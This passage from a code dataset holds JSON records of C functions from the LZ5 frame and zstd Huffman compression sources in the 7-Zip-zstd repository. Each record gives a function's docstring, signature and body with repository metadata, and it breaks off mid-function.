LZ5F_compressBlock(dstPtr, cctxPtr->tmpIn, cctxPtr->tmpInSize, compress, cctxPtr->lz5CtxPtr);\n    if (cctxPtr->prefs.frameInfo.blockMode==LZ5F_blockLinked) cctxPtr->tmpIn += cctxPtr->tmpInSize;\n    cctxPtr->tmpInSize = 0;\n\n    /* keep tmpIn within limits */\n    if ((cctxPtr->tmpIn + cctxPtr->maxBlockSize) > (cctxPtr->tmpBuff + cctxPtr->maxBufferSize))   /* necessarily LZ5F_blockLinked */\n    {\n        int realDictSize = LZ5F_localSaveDict(cctxPtr);\n        cctxPtr->tmpIn = cctxPtr->tmpBuff + realDictSize;\n    }\n\n    return dstPtr - dstStart;\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_decodeHeader\n   return : nb Bytes read from srcVoidPtr (necessarily <= srcSize)\n            or an error code (testable with LZ5F_isError())\n   output : set internal values of dctx, such as\n            dctxPtr->frameInfo and dctxPtr->dStage.\n   input  : srcVoidPtr points at the **beginning of the frame**\n*/\n", "func_signal": "static size_t LZ5F_decodeHeader(LZ5F_dctx_t* dctxPtr, const void* srcVoidPtr, size_t srcSize)", "code": "{\n    BYTE FLG, BD, HC;\n    unsigned version, blockMode, blockChecksumFlag, contentSizeFlag, contentChecksumFlag, blockSizeID;\n    size_t bufferNeeded;\n    size_t frameHeaderSize;\n    const BYTE* srcPtr = (const BYTE*)srcVoidPtr;\n\n    /* need to decode header to get frameInfo */\n    if (srcSize < minFHSize) return (size_t)-LZ5F_ERROR_frameHeader_incomplete;   /* minimal frame header size */\n    memset(&(dctxPtr->frameInfo), 0, sizeof(dctxPtr->frameInfo));\n\n    /* special case : skippable frames */\n    if ((LZ5F_readLE32(srcPtr) & 0xFFFFFFF0U) == LZ5F_MAGIC_SKIPPABLE_START)\n    {\n        dctxPtr->frameInfo.frameType = LZ5F_skippableFrame;\n        if (srcVoidPtr == (void*)(dctxPtr->header))\n        {\n            dctxPtr->tmpInSize = srcSize;\n            dctxPtr->tmpInTarget = 8;\n            dctxPtr->dStage = dstage_storeSFrameSize;\n            return srcSize;\n        }\n        else\n        {\n            dctxPtr->dStage = dstage_getSFrameSize;\n            return 4;\n        }\n    }\n\n    /* control magic number */\n    if (LZ5F_readLE32(srcPtr) != LZ5F_MAGICNUMBER) return (size_t)-LZ5F_ERROR_frameType_unknown;\n    dctxPtr->frameInfo.frameType = LZ5F_frame;\n\n    /* Flags */\n    FLG = srcPtr[4];\n    version = (FLG>>6) & _2BITS;\n    blockMode = (FLG>>5) & _1BIT;\n    blockChecksumFlag = (FLG>>4) & _1BIT;\n    contentSizeFlag = (FLG>>3) & _1BIT;\n    contentChecksumFlag = (FLG>>2) & _1BIT;\n\n    /* Frame Header Size */\n    frameHeaderSize = contentSizeFlag ? maxFHSize : minFHSize;\n\n    if (srcSize < frameHeaderSize)\n    {\n        /* not enough input to fully decode frame header */\n        if (srcPtr != dctxPtr->header)\n            memcpy(dctxPtr->header, srcPtr, srcSize);\n        dctxPtr->tmpInSize = srcSize;\n        dctxPtr->tmpInTarget = frameHeaderSize;\n        dctxPtr->dStage = dstage_storeHeader;\n        return srcSize;\n    }\n\n    BD = srcPtr[5];\n    blockSizeID = (BD>>4) & _3BITS;\n\n    /* validate */\n    if (version != 1) return (size_t)-LZ5F_ERROR_headerVersion_wrong;        /* Version Number, only supported value */\n    if (blockChecksumFlag != 0) return (size_t)-LZ5F_ERROR_blockChecksum_unsupported; /* Not supported for the time being */\n    if (((FLG>>0)&_2BITS) != 0) return (size_t)-LZ5F_ERROR_reservedFlag_set; /* Reserved bits */\n    if (((BD>>7)&_1BIT) != 0) return (size_t)-LZ5F_ERROR_reservedFlag_set;   /* Reserved bit */\n    if (blockSizeID < 1) return (size_t)-LZ5F_ERROR_maxBlockSize_invalid;    /* 1-7 only supported values for the time being */\n    if (((BD>>0)&_4BITS) != 0) return (size_t)-LZ5F_ERROR_reservedFlag_set;  /* Reserved bits */\n\n    /* check */\n    HC = LZ5F_headerChecksum(srcPtr+4, frameHeaderSize-5);\n    if (HC != srcPtr[frameHeaderSize-1]) return (size_t)-LZ5F_ERROR_headerChecksum_invalid;   /* Bad header checksum error */\n\n    /* save */\n    dctxPtr->frameInfo.blockMode = (LZ5F_blockMode_t)blockMode;\n    dctxPtr->frameInfo.contentChecksumFlag = (LZ5F_contentChecksum_t)contentChecksumFlag;\n    dctxPtr->frameInfo.blockSizeID = (LZ5F_blockSizeID_t)blockSizeID;\n    dctxPtr->maxBlockSize = LZ5F_getBlockSize(blockSizeID);\n    if (contentSizeFlag)\n        dctxPtr->frameRemainingSize = dctxPtr->frameInfo.contentSize = LZ5F_readLE64(srcPtr+6);\n\n    /* init */\n    if (contentChecksumFlag) XXH32_reset(&(dctxPtr->xxh), 0);\n\n    /* alloc */\n    bufferNeeded = dctxPtr->maxBlockSize + ((dctxPtr->frameInfo.blockMode==LZ5F_blockLinked) * 2 * LZ5F_DICT_SIZE);\n    if (bufferNeeded > dctxPtr->maxBufferSize)   /* tmp buffers too small */\n    {\n        FREEMEM(dctxPtr->tmpIn);\n        FREEMEM(dctxPtr->tmpOutBuffer);\n        dctxPtr->maxBufferSize = bufferNeeded;\n        dctxPtr->tmpIn = (BYTE*)ALLOCATOR(dctxPtr->maxBlockSize);\n        if (dctxPtr->tmpIn == NULL) return (size_t)-LZ5F_ERROR_GENERIC;\n        dctxPtr->tmpOutBuffer= (BYTE*)ALLOCATOR(dctxPtr->maxBufferSize);\n        if (dctxPtr->tmpOutBuffer== NULL) return (size_t)-LZ5F_ERROR_GENERIC;\n    }\n    dctxPtr->tmpInSize = 0;\n    dctxPtr->tmpInTarget = 0;\n    dctxPtr->dict = dctxPtr->tmpOutBuffer;\n    dctxPtr->dictSize = 0;\n    dctxPtr->tmpOut = dctxPtr->tmpOutBuffer;\n    dctxPtr->tmpOutStart = 0;\n    dctxPtr->tmpOutSize = 0;\n\n    dctxPtr->dStage = dstage_getCBlockSize;\n\n    return frameHeaderSize;\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_createCompressionContext() :\n* The first thing to do is to create a compressionContext object, which will be used in all compression operations.\n* This is achieved using LZ5F_createCompressionContext(), which takes as argument a version and an LZ5F_preferences_t structure.\n* The version provided MUST be LZ5F_VERSION. It is intended to track potential version differences between different binaries.\n* The function will provide a pointer to an allocated LZ5F_compressionContext_t object.\n* If the result LZ5F_errorCode_t is not OK_NoError, there was an error during context creation.\n* Object can release its memory using LZ5F_freeCompressionContext();\n*/\n", "func_signal": "LZ5F_errorCode_t LZ5F_createCompressionContext(LZ5F_compressionContext_t* LZ5F_compressionContextPtr, unsigned version)", "code": "{\n    LZ5F_cctx_t* cctxPtr;\n\n    cctxPtr = (LZ5F_cctx_t*)ALLOCATOR(sizeof(LZ5F_cctx_t));\n    if (cctxPtr==NULL) return (LZ5F_errorCode_t)(-LZ5F_ERROR_allocation_failed);\n\n    cctxPtr->version = version;\n    cctxPtr->cStage = 0;   /* Next stage : write header */\n\n    *LZ5F_compressionContextPtr = (LZ5F_compressionContext_t)cctxPtr;\n\n    return LZ5F_OK_NoError;\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* HUF_buildTree():\n * Takes the huffNode array sorted by HUF_sort() and builds an unlimited-depth Huffman tree.\n *\n * @param huffNode        The array sorted by HUF_sort(). Builds the Huffman tree in this array.\n * @param maxSymbolValue  The maximum symbol value.\n * @return                The smallest node in the Huffman tree (by count).\n */\n", "func_signal": "static int HUF_buildTree(nodeElt* huffNode, U32 maxSymbolValue)", "code": "{\n    nodeElt* const huffNode0 = huffNode - 1;\n    int nonNullRank;\n    int lowS, lowN;\n    int nodeNb = STARTNODE;\n    int n, nodeRoot;\n    /* init for parents */\n    nonNullRank = (int)maxSymbolValue;\n    while(huffNode[nonNullRank].count == 0) nonNullRank--;\n    lowS = nonNullRank; nodeRoot = nodeNb + lowS - 1; lowN = nodeNb;\n    huffNode[nodeNb].count = huffNode[lowS].count + huffNode[lowS-1].count;\n    huffNode[lowS].parent = huffNode[lowS-1].parent = (U16)nodeNb;\n    nodeNb++; lowS-=2;\n    for (n=nodeNb; n<=nodeRoot; n++) huffNode[n].count = (U32)(1U<<30);\n    huffNode0[0].count = (U32)(1U<<31);  /* fake entry, strong barrier */\n\n    /* create parents */\n    while (nodeNb <= nodeRoot) {\n        int const n1 = (huffNode[lowS].count < huffNode[lowN].count) ? lowS-- : lowN++;\n        int const n2 = (huffNode[lowS].count < huffNode[lowN].count) ? lowS-- : lowN++;\n        huffNode[nodeNb].count = huffNode[n1].count + huffNode[n2].count;\n        huffNode[n1].parent = huffNode[n2].parent = (U16)nodeNb;\n        nodeNb++;\n    }\n\n    /* distribute weights (unlimited tree height) */\n    huffNode[nodeRoot].nbBits = 0;\n    for (n=nodeRoot-1; n>=STARTNODE; n--)\n        huffNode[n].nbBits = huffNode[ huffNode[n].parent ].nbBits + 1;\n    for (n=0; n<=nonNullRank; n++)\n        huffNode[n].nbBits = huffNode[ huffNode[n].parent ].nbBits + 1;\n\n    return nonNullRank;\n}", "path": "7-Zip-zstd/C/zstd/huf_compress.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/*! HUF_writeCTable() :\n    `CTable` : Huffman tree to save, using huf representation.\n    @return : size of saved CTable */\n", "func_signal": "size_t HUF_writeCTable (void* dst, size_t maxDstSize,\n                        const HUF_CElt* CTable, unsigned maxSymbolValue, unsigned huffLog)", "code": "{\n    BYTE bitsToWeight[HUF_TABLELOG_MAX + 1];   /* precomputed conversion table */\n    BYTE huffWeight[HUF_SYMBOLVALUE_MAX];\n    BYTE* op = (BYTE*)dst;\n    U32 n;\n\n     /* check conditions */\n    if (maxSymbolValue > HUF_SYMBOLVALUE_MAX) return ERROR(maxSymbolValue_tooLarge);\n\n    /* convert to weight */\n    bitsToWeight[0] = 0;\n    for (n=1; n<huffLog+1; n++)\n        bitsToWeight[n] = (BYTE)(huffLog + 1 - n);\n    for (n=0; n<maxSymbolValue; n++)\n        huffWeight[n] = bitsToWeight[CTable[n].nbBits];\n\n    /* attempt weights compression by FSE */\n    {   CHECK_V_F(hSize, HUF_compressWeights(op+1, maxDstSize-1, huffWeight, maxSymbolValue) );\n        if ((hSize>1) & (hSize < maxSymbolValue/2)) {   /* FSE compressed */\n            op[0] = (BYTE)hSize;\n            return hSize+1;\n    }   }\n\n    /* write raw values as 4-bits (max : 15) */\n    if (maxSymbolValue > (256-128)) return ERROR(GENERIC);   /* should not happen : likely means source cannot be compressed */\n    if (((maxSymbolValue+1)/2) + 1 > maxDstSize) return ERROR(dstSize_tooSmall);   /* not enough space within dst buffer */\n    op[0] = (BYTE)(128 /*special case*/ + (maxSymbolValue-1));\n    huffWeight[maxSymbolValue] = 0;   /* to be sure it doesn't cause msan issue in final combination */\n    for (n=0; n<maxSymbolValue; n+=2)\n        op[(n/2)+1] = (BYTE)((huffWeight[n] << 4) + huffWeight[n+1]);\n    return ((maxSymbolValue+1)/2) + 1;\n}", "path": "7-Zip-zstd/C/zstd/huf_compress.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_compressBound() : gives the size of Dst buffer given a srcSize to handle worst case situations.\n*                        The LZ5F_frameInfo_t structure is optional :\n*                        you can provide NULL as argument, preferences will then be set to cover worst case situations.\n* */\n", "func_signal": "size_t LZ5F_compressBound(size_t srcSize, const LZ5F_preferences_t* preferencesPtr)", "code": "{\n    LZ5F_preferences_t prefsNull;\n    memset(&prefsNull, 0, sizeof(prefsNull));\n    prefsNull.frameInfo.contentChecksumFlag = LZ5F_contentChecksumEnabled;   /* worst case */\n    {\n        const LZ5F_preferences_t* prefsPtr = (preferencesPtr==NULL) ? &prefsNull : preferencesPtr;\n        LZ5F_blockSizeID_t bid = prefsPtr->frameInfo.blockSizeID;\n        size_t blockSize = LZ5F_getBlockSize(bid);\n        unsigned nbBlocks = (unsigned)(srcSize / blockSize) + 1;\n        size_t lastBlockSize = prefsPtr->autoFlush ? srcSize % blockSize : blockSize;\n        size_t blockInfo = 4;   /* default, without block CRC option */\n        size_t frameEnd = 4 + (prefsPtr->frameInfo.contentChecksumFlag*4);\n\n        return (blockInfo * nbBlocks) + (blockSize * (nbBlocks-1)) + lastBlockSize + frameEnd;;\n    }\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_compressBegin() :\n* will write the frame header into dstBuffer.\n* dstBuffer must be large enough to accommodate a header (dstMaxSize). Maximum header size is LZ5F_MAXHEADERFRAME_SIZE bytes.\n* The result of the function is the number of bytes written into dstBuffer for the header\n* or an error code (can be tested using LZ5F_isError())\n*/\n", "func_signal": "size_t LZ5F_compressBegin(LZ5F_compressionContext_t compressionContext, void* dstBuffer, size_t dstMaxSize, const LZ5F_preferences_t* preferencesPtr)", "code": "{\n    LZ5F_preferences_t prefNull;\n    LZ5F_cctx_t* cctxPtr = (LZ5F_cctx_t*)compressionContext;\n    BYTE* const dstStart = (BYTE*)dstBuffer;\n    BYTE* dstPtr = dstStart;\n    BYTE* headerStart;\n    size_t requiredBuffSize;\n\n    if (dstMaxSize < maxFHSize) return (size_t)-LZ5F_ERROR_dstMaxSize_tooSmall;\n    if (cctxPtr->cStage != 0) return (size_t)-LZ5F_ERROR_GENERIC;\n    memset(&prefNull, 0, sizeof(prefNull));\n    if (preferencesPtr == NULL) preferencesPtr = &prefNull;\n    cctxPtr->prefs = *preferencesPtr;\n    cctxPtr->prefs.frameInfo.blockMode = LZ5F_blockIndependent;\n\n    /* ctx Management */\n    {\n        U32 tableID = (cctxPtr->prefs.compressionLevel < minHClevel) ? 1 : 2;  /* 0:nothing ; 1:LZ5_createStream ; 2:LZ5_createStreamHC */\n      //  printf(\"BEFORE lz5CtxLevel=%d tableID=%d compressionLevel=%d minHClevel=%d\\n\", (int)cctxPtr->lz5CtxLevel, (int)tableID, (int)cctxPtr->prefs.compressionLevel, minHClevel);\n        if (cctxPtr->lz5CtxLevel != tableID)\n        {\n            LZ5F_freeStream(cctxPtr);\n\n            cctxPtr->lz5CtxLevel = tableID;\n            if (cctxPtr->lz5CtxLevel == 1)\n                cctxPtr->lz5CtxPtr = (void*)LZ5_createStream();\n            else\n                cctxPtr->lz5CtxPtr = (void*)LZ5_createStreamHC(cctxPtr->prefs.compressionLevel);\n        }\n    }\n\n    /* Buffer Management */\n    if (cctxPtr->prefs.frameInfo.blockSizeID == 0) cctxPtr->prefs.frameInfo.blockSizeID = LZ5F_BLOCKSIZEID_DEFAULT;\n    cctxPtr->maxBlockSize = LZ5F_getBlockSize(cctxPtr->prefs.frameInfo.blockSizeID);\n\n    requiredBuffSize = cctxPtr->maxBlockSize + ((cctxPtr->prefs.frameInfo.blockMode == LZ5F_blockLinked) * 2 * LZ5F_DICT_SIZE);\n    if (preferencesPtr->autoFlush)\n        requiredBuffSize = (cctxPtr->prefs.frameInfo.blockMode == LZ5F_blockLinked) * LZ5F_DICT_SIZE;   /* just needs dict */\n\n    if (cctxPtr->maxBufferSize < requiredBuffSize)\n    {\n        cctxPtr->maxBufferSize = requiredBuffSize;\n        FREEMEM(cctxPtr->tmpBuff);\n        cctxPtr->tmpBuff = (BYTE*)ALLOCATOR(requiredBuffSize);\n        if (cctxPtr->tmpBuff == NULL) return (size_t)-LZ5F_ERROR_allocation_failed;\n    }\n    cctxPtr->tmpIn = cctxPtr->tmpBuff;\n    cctxPtr->tmpInSize = 0;\n    XXH32_reset(&(cctxPtr->xxh), 0);\n    if (cctxPtr->prefs.compressionLevel < minHClevel)\n        LZ5_resetStream((LZ5_stream_t*)(cctxPtr->lz5CtxPtr));\n    else\n        LZ5_resetStreamHC((LZ5_streamHC_t*)(cctxPtr->lz5CtxPtr));\n\n    /* Magic Number */\n    LZ5F_writeLE32(dstPtr, LZ5F_MAGICNUMBER);\n    dstPtr += 4;\n    headerStart = dstPtr;\n\n    /* FLG Byte */\n    *dstPtr++ = (BYTE)(((1 & _2BITS) << 6)    /* Version('01') */\n        + ((cctxPtr->prefs.frameInfo.blockMode & _1BIT ) << 5)    /* Block mode */\n        + ((cctxPtr->prefs.frameInfo.contentChecksumFlag & _1BIT ) << 2)   /* Frame checksum */\n        + ((cctxPtr->prefs.frameInfo.contentSize > 0) << 3));   /* Frame content size */\n    /* BD Byte */\n    *dstPtr++ = (BYTE)((cctxPtr->prefs.frameInfo.blockSizeID & _3BITS) << 4);\n    /* Optional Frame content size field */\n    if (cctxPtr->prefs.frameInfo.contentSize)\n    {\n        LZ5F_writeLE64(dstPtr, cctxPtr->prefs.frameInfo.contentSize);\n        dstPtr += 8;\n        cctxPtr->totalInSize = 0;\n    }\n    /* CRC Byte */\n    *dstPtr = LZ5F_headerChecksum(headerStart, dstPtr - headerStart);\n    dstPtr++;\n\n    cctxPtr->cStage = 1;   /* header written, now request input data block */\n\n    return (dstPtr - dstStart);\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/**************************************\n*  Simple compression functions\n**************************************/\n", "func_signal": "static LZ5F_blockSizeID_t LZ5F_optimalBSID(const LZ5F_blockSizeID_t requestedBSID, const size_t srcSize)", "code": "{\n    LZ5F_blockSizeID_t proposedBSID = LZ5F_max64KB;\n    size_t maxBlockSize = 64 KB;\n    while (requestedBSID > proposedBSID)\n    {\n        if (srcSize <= maxBlockSize)\n            return proposedBSID;\n        proposedBSID = (LZ5F_blockSizeID_t)((int)proposedBSID + 1);\n        maxBlockSize <<= 2;\n    }\n    return requestedBSID;\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_createDecompressionContext() :\n* The first thing to do is to create a decompressionContext object, which will be used in all decompression operations.\n* This is achieved using LZ5F_createDecompressionContext().\n* The function will provide a pointer to a fully allocated and initialized LZ5F_decompressionContext object.\n* If the result LZ5F_errorCode_t is not zero, there was an error during context creation.\n* Object can release its memory using LZ5F_freeDecompressionContext();\n*/\n", "func_signal": "LZ5F_errorCode_t LZ5F_createDecompressionContext(LZ5F_decompressionContext_t* LZ5F_decompressionContextPtr, unsigned versionNumber)", "code": "{\n    LZ5F_dctx_t* dctxPtr;\n\n    dctxPtr = (LZ5F_dctx_t*)ALLOCATOR(sizeof(LZ5F_dctx_t));\n    if (dctxPtr==NULL) return (LZ5F_errorCode_t)-LZ5F_ERROR_GENERIC;\n\n    dctxPtr->version = versionNumber;\n    *LZ5F_decompressionContextPtr = (LZ5F_decompressionContext_t)dctxPtr;\n    return LZ5F_OK_NoError;\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* HUF_compress4X_repeat():\n * compress input using 4 streams.\n * provide workspace to generate compression tables */\n", "func_signal": "size_t HUF_compress4X_wksp (void* dst, size_t dstSize,\n                      const void* src, size_t srcSize,\n                      unsigned maxSymbolValue, unsigned huffLog,\n                      void* workSpace, size_t wkspSize)", "code": "{\n    return HUF_compress_internal(dst, dstSize, src, srcSize,\n                                 maxSymbolValue, huffLog, HUF_fourStreams,\n                                 workSpace, wkspSize,\n                                 NULL, NULL, 0, 0 /*bmi2*/);\n}", "path": "7-Zip-zstd/C/zstd/huf_compress.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/** HUF_buildCTable() :\n * @return : maxNbBits\n *  Note : count is used before tree is written, so they can safely overlap\n */\n", "func_signal": "size_t HUF_buildCTable (HUF_CElt* tree, const unsigned* count, unsigned maxSymbolValue, unsigned maxNbBits)", "code": "{\n    HUF_buildCTable_wksp_tables workspace;\n    return HUF_buildCTable_wksp(tree, count, maxSymbolValue, maxNbBits, &workspace, sizeof(workspace));\n}", "path": "7-Zip-zstd/C/zstd/huf_compress.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/**\n * HUF_sort():\n * Sorts the symbols [0, maxSymbolValue] by count[symbol] in decreasing order.\n *\n * @param[out] huffNode       Sorted symbols by decreasing count. Only members `.count` and `.byte` are filled.\n *                            Must have (maxSymbolValue + 1) entries.\n * @param[in]  count          Histogram of the symbols.\n * @param[in]  maxSymbolValue Maximum symbol value.\n * @param      rankPosition   This is a scratch workspace. Must have RANK_POSITION_TABLE_SIZE entries.\n */\n", "func_signal": "static void HUF_sort(nodeElt* huffNode, const unsigned* count, U32 maxSymbolValue, rankPos* rankPosition)", "code": "{\n    int n;\n    int const maxSymbolValue1 = (int)maxSymbolValue + 1;\n\n    /* Compute base and set curr to base.\n     * For symbol s let lowerRank = BIT_highbit32(count[n]+1) and rank = lowerRank + 1.\n     * Then 2^lowerRank <= count[n]+1 <= 2^rank.\n     * We attribute each symbol to lowerRank's base value, because we want to know where\n     * each rank begins in the output, so for rank R we want to count ranks R+1 and above.\n     */\n    ZSTD_memset(rankPosition, 0, sizeof(*rankPosition) * RANK_POSITION_TABLE_SIZE);\n    for (n = 0; n < maxSymbolValue1; ++n) {\n        U32 lowerRank = BIT_highbit32(count[n] + 1);\n        rankPosition[lowerRank].base++;\n    }\n    assert(rankPosition[RANK_POSITION_TABLE_SIZE - 1].base == 0);\n    for (n = RANK_POSITION_TABLE_SIZE - 1; n > 0; --n) {\n        rankPosition[n-1].base += rankPosition[n].base;\n        rankPosition[n-1].curr = rankPosition[n-1].base;\n    }\n    /* Sort */\n    for (n = 0; n < maxSymbolValue1; ++n) {\n        U32 const c = count[n];\n        U32 const r = BIT_highbit32(c+1) + 1;\n        U32 pos = rankPosition[r].curr++;\n        /* Insert into the correct position in the rank.\n         * We have at most 256 symbols, so this insertion should be fine.\n         */\n        while ((pos > rankPosition[r].base) && (c > huffNode[pos-1].count)) {\n            huffNode[pos] = huffNode[pos-1];\n            pos--;\n        }\n        huffNode[pos].count = c;\n        huffNode[pos].byte  = (BYTE)n;\n    }\n}", "path": "7-Zip-zstd/C/zstd/huf_compress.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/**\n * HUF_buildCTableFromTree():\n * Build the CTable given the Huffman tree in huffNode.\n *\n * @param[out] CTable         The output Huffman CTable.\n * @param      huffNode       The Huffman tree.\n * @param      nonNullRank    The last and smallest node in the Huffman tree.\n * @param      maxSymbolValue The maximum symbol value.\n * @param      maxNbBits      The exact maximum number of bits used in the Huffman tree.\n */\n", "func_signal": "static void HUF_buildCTableFromTree(HUF_CElt* CTable, nodeElt const* huffNode, int nonNullRank, U32 maxSymbolValue, U32 maxNbBits)", "code": "{\n    /* fill result into ctable (val, nbBits) */\n    int n;\n    U16 nbPerRank[HUF_TABLELOG_MAX+1] = {0};\n    U16 valPerRank[HUF_TABLELOG_MAX+1] = {0};\n    int const alphabetSize = (int)(maxSymbolValue + 1);\n    for (n=0; n<=nonNullRank; n++)\n        nbPerRank[huffNode[n].nbBits]++;\n    /* determine starting value per rank */\n    {   U16 min = 0;\n        for (n=(int)maxNbBits; n>0; n--) {\n            valPerRank[n] = min;      /* get starting value within each rank */\n            min += nbPerRank[n];\n            min >>= 1;\n    }   }\n    for (n=0; n<alphabetSize; n++)\n        CTable[huffNode[n].byte].nbBits = huffNode[n].nbBits;   /* push nbBits per symbol, symbol order */\n    for (n=0; n<alphabetSize; n++)\n        CTable[n].val = valPerRank[CTable[n].nbBits]++;   /* assign value within rank, symbol order */\n}", "path": "7-Zip-zstd/C/zstd/huf_compress.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_compressEnd()\n* When you want to properly finish the compressed frame, just call LZ5F_compressEnd().\n* It will flush whatever data remained within compressionContext (like LZ5_flush())\n* but also properly finalize the frame, with an endMark and a checksum.\n* The result of the function is the number of bytes written into dstBuffer (necessarily >= 4 (endMark size))\n* The function outputs an error code if it fails (can be tested using LZ5F_isError())\n* The LZ5F_compressOptions_t structure is optional : you can provide NULL as argument.\n* compressionContext can then be used again, starting with LZ5F_compressBegin(). The preferences will remain the same.\n*/\n", "func_signal": "size_t LZ5F_compressEnd(LZ5F_compressionContext_t compressionContext, void* dstBuffer, size_t dstMaxSize, const LZ5F_compressOptions_t* compressOptionsPtr)", "code": "{\n    LZ5F_cctx_t* cctxPtr = (LZ5F_cctx_t*)compressionContext;\n    BYTE* const dstStart = (BYTE*)dstBuffer;\n    BYTE* dstPtr = dstStart;\n    size_t errorCode;\n\n    errorCode = LZ5F_flush(compressionContext, dstBuffer, dstMaxSize, compressOptionsPtr);\n    if (LZ5F_isError(errorCode)) return errorCode;\n    dstPtr += errorCode;\n\n    LZ5F_writeLE32(dstPtr, 0);\n    dstPtr+=4;   /* endMark */\n\n    if (cctxPtr->prefs.frameInfo.contentChecksumFlag == LZ5F_contentChecksumEnabled)\n    {\n        U32 xxh = XXH32_digest(&(cctxPtr->xxh));\n        LZ5F_writeLE32(dstPtr, xxh);\n        dstPtr+=4;   /* content Checksum */\n    }\n\n    cctxPtr->cStage = 0;   /* state is now re-usable (with identical preferences) */\n\n    if (cctxPtr->prefs.frameInfo.contentSize)\n    {\n        if (cctxPtr->prefs.frameInfo.contentSize != cctxPtr->totalInSize)\n            return (size_t)-LZ5F_ERROR_frameSize_wrong;\n    }\n\n    return dstPtr - dstStart;\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_getFrameInfo()\n* This function decodes frame header information, such as blockSize.\n* It is optional : you could start by calling directly LZ5F_decompress() instead.\n* The objective is to extract header information without starting decompression, typically for allocation purposes.\n* LZ5F_getFrameInfo() can also be used *after* starting decompression, on a valid LZ5F_decompressionContext_t.\n* The number of bytes read from srcBuffer will be provided within *srcSizePtr (necessarily <= original value).\n* You are expected to resume decompression from where it stopped (srcBuffer + *srcSizePtr)\n* The function result is an hint of the better srcSize to use for next call to LZ5F_decompress,\n* or an error code which can be tested using LZ5F_isError().\n*/\n", "func_signal": "LZ5F_errorCode_t LZ5F_getFrameInfo(LZ5F_decompressionContext_t dCtx, LZ5F_frameInfo_t* frameInfoPtr,\n                                   const void* srcBuffer, size_t* srcSizePtr)", "code": "{\n    LZ5F_dctx_t* dctxPtr = (LZ5F_dctx_t*)dCtx;\n\n    if (dctxPtr->dStage > dstage_storeHeader)   /* note : requires dstage_* header related to be at beginning of enum */\n    {\n        size_t o=0, i=0;\n        /* frameInfo already decoded */\n        *srcSizePtr = 0;\n        *frameInfoPtr = dctxPtr->frameInfo;\n        return LZ5F_decompress(dCtx, NULL, &o, NULL, &i, NULL);\n    }\n    else\n    {\n        size_t o=0;\n        size_t nextSrcSize = LZ5F_decompress(dCtx, NULL, &o, srcBuffer, srcSizePtr, NULL);\n        if (dctxPtr->dStage <= dstage_storeHeader)   /* note : requires dstage_* header related to be at beginning of enum */\n            return (size_t)-LZ5F_ERROR_frameHeader_incomplete;\n        *frameInfoPtr = dctxPtr->frameInfo;\n        return nextSrcSize;\n    }\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* LZ5F_compressFrame()\n* Compress an entire srcBuffer into a valid LZ5 frame, as defined by specification v1.5.0, in a single step.\n* The most important rule is that dstBuffer MUST be large enough (dstMaxSize) to ensure compression completion even in worst case.\n* You can get the minimum value of dstMaxSize by using LZ5F_compressFrameBound()\n* If this condition is not respected, LZ5F_compressFrame() will fail (result is an errorCode)\n* The LZ5F_preferences_t structure is optional : you can provide NULL as argument. All preferences will then be set to default.\n* The result of the function is the number of bytes written into dstBuffer.\n* The function outputs an error code if it fails (can be tested using LZ5F_isError())\n*/\n", "func_signal": "size_t LZ5F_compressFrame(void* dstBuffer, size_t dstMaxSize, const void* srcBuffer, size_t srcSize, const LZ5F_preferences_t* preferencesPtr)", "code": "{\n    LZ5F_cctx_t cctxI;\n    LZ5F_preferences_t prefs;\n    LZ5F_compressOptions_t options;\n    LZ5F_errorCode_t errorCode;\n    BYTE* const dstStart = (BYTE*) dstBuffer;\n    BYTE* dstPtr = dstStart;\n    BYTE* const dstEnd = dstStart + dstMaxSize;\n\n    memset(&cctxI, 0, sizeof(cctxI));   /* works because no allocation 